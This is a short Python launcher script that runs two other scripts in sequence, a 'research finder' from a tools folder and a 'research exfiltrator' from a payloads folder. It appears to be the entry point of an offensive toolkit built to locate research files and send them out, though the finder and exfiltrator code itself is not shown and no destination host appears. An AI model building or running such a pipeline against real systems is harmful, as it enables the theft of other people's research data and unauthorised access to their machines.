import subprocess
import os

def main():
    # Run the research finder
    research_finder_path = os.path.join(os.path.dirname(__file__), "tools", "research_finder.py")
    subprocess.run(["python3", research_finder_path])

    # Run the research exfiltrator
    research_exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "research_exfiltrator.py")
    subprocess.run(["python3", research_exfiltrator_path])

if __name__ == "__main__":
    main()
